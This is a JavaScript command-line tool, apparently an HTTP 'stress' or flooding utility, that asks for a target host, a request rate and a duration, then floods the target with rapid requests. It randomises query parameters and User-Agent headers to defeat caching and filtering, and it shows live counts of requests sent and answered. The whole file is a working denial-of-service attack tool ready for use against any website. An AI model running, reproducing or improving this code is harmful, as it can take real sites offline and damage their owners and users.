const Uuniq = require("uuniq")
    , Dayjs = require("dayjs")
    , Duration = require("dayjs/plugin/duration");
Dayjs.extend(Duration);
const randomua = require("random-useragent")
    , kindof = require("kind-of")
    , readline = require("readline")
    , Snowflake = new Uuniq.Snowflake
    , Symbolic = new Uuniq.Symbolic
    , rl = readline.createInterface({ input: process.stdin, output: process.stdout })
    , Package = require("./package.json");
let intervals = {};
const print = () => { console.clear(), console.log("\n"), console.log("    \x1b[90m #####   ######   #####    #####    #####    #####", "\x1b[0m"), console.log("    \x1b[90m##         ##     ##  ##   ##      ##       ##", "\x1b[0m"), console.log("    \x1b[90m ####      ##     #####    ####     ####     ####", "\x1b[0m"), console.log("    \x1b[90m    ##     ##     ##  ##   ##          ##       ##", "\x1b[0m"), console.log("    \x1b[90m#####      ##     ##  ##   #####   #####    #####", "\x1b[0m"), console.log(""), console.log("                                                   \x1b[37mv" + Package.version, "\x1b[0m"), console.log("") }
    , start = () => {
        print(), rl.question("Target: ", t => {
            if (print(), "string" !== kindof(t = t.toLowerCase()
                    .trim()
                    .split("https://")
                    .join("")
                    .split("http://")
                    .join("")
                    .split("/")[0])) { console.log("Field target must be a string."), setTimeout(start, 2500); return }
            if ("" === t) { console.log("Field target cannot be left blank."), setTimeout(start, 2500); return } console.log("Target: " + t), rl.question("PPT: ", e => {
                if (print(), isNaN(e)) { console.log("Field ppt must be a number."), setTimeout(start, 2500); return }
                if ("" === e) { console.log("Field ppt cannot be left blank."), setTimeout(start, 2500); return } e < 1 && (e = 1), e > 100 && (e = 100), console.log("Target: " + t), console.log("PPT: " + e), rl.question("Duration: ", async n => {
                    if (print(), isNaN(n)) { console.log("Field duration must be a number."), setTimeout(start, 2500); return }
                    if ("" === n) { console.log("Field duration cannot be left blank."), setTimeout(start, 2500); return } n < 1 && (n = 1), n > 43200 && (n = 43200), console.log("Target: " + t), console.log("PPT: " + e), console.log("Duration: " + n), console.log(""), console.log("Status                       \x1b[33mPreparing... ⟳", "\x1b[0m"), console.log("Packets Sent                 \x1b[90m--", "\x1b[0m"), console.log("Successful Resp.             \x1b[90m--", "\x1b[0m"), console.log("Unsuccessful Resp.           \x1b[90m--", "\x1b[0m"), console.log("Remaining Time               \x1b[90m--", "\x1b[0m"), console.log(""), await Bun.sleep(1e3), print(), console.log("Target: " + t), console.log("PPT: " + e), console.log("Duration: " + n), console.log(""), console.log("Status                       \x1b[33mAlmost Ready... ⟳", "\x1b[0m"), console.log("Packets Sent                 \x1b[90m--", "\x1b[0m"), console.log("Successful Resp.             \x1b[90m--", "\x1b[0m"), console.log("Unsuccessful Resp.           \x1b[90m--", "\x1b[0m"), console.log("Remaining Time               \x1b[90m--", "\x1b[0m"), console.log(""), await Bun.sleep(2500);
                    let o = !0
                        , l = 0
                        , a = 0
                        , $ = 0
                        , i = n;
                    intervals.PACKETS_SENT = setInterval(() => {
                        for (let n = 0; n < e; n++) l++, fetch("http://" + t + "?" + Symbolic.generate() + "=" + Snowflake.generate(), { headers: { "User-Agent": randomua.getRandom() } })
                            .then(t => { a++ })
                            .catch(t => { $++ })
                    });
                    let r, s, g, m;
                    setInterval(() => {
                        print(), console.log("Target: " + t), console.log("PPT: " + e), console.log("Duration: " + n), console.log(""), console.log("Status                       " + (o ? "\x1b[37mRunning ▶" : "\x1b[31mStopped ■"), "\x1b[0m"), console.log("Packets Sent                 " + (r !== l ? "\x1b[34m" : "\x1b[90m") + (void 0 !== l ? l + " ↑" : "--"), "\x1b[0m"), console.log("Successful Resp.             " + (s !== a ? "\x1b[32m" : "\x1b[90m") + (void 0 !== a ? a + " ↓" : "--"), "\x1b[0m"), console.log("Unsuccessful Resp.           " + (g !== $ ? "\x1b[31m" : "\x1b[90m") + (void 0 !== $ ? $ + " ⇣" : "--"), "\x1b[0m"), console.log("Remaining Time               " + (m !== i ? "\x1b[33m" : "\x1b[90m") + (void 0 !== i ? Dayjs.duration(i, "seconds")
                            .format("HH:mm:ss") + " ⏱︎" : "--"), "\x1b[0m"), console.log(""), r = l, s = a, g = $, m = i
                    }, 1e3), setInterval(() => { 0 === i ? (o = !1, clearInterval(intervals.PACKETS_SENT)) : i-- }, 1e3)
                })
            })
        })
    };
start();